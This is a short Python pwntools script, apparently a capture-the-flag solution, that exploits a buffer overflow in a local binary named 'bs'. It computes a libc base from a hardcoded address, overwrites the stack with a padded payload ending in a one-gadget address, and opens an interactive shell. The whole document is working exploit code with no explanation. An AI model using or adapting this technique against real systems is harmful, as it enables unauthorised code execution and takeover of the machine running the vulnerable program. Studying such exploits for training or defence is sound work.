from pwn import *
binary=ELF('./bs')
lib=ELF("./libc.so")
system_off=lib.symbols['system']
context.arch=binary.arch
context.log_level='debug'
p=process("./bs",env={'LD_PRELOAD':"./libc.so"})
base=0x7ffff7a576d0-system_off
info("===========%s==============",hex(base))
size=0x1800
payload=("\x00"*(0x1010)+p64(0)+p64(0x455aa+base))
payload=payload.ljust(0x1800,'\x00')
p.sendlineafter("send?",str(size))
p.sendline(payload)
p.interactive()
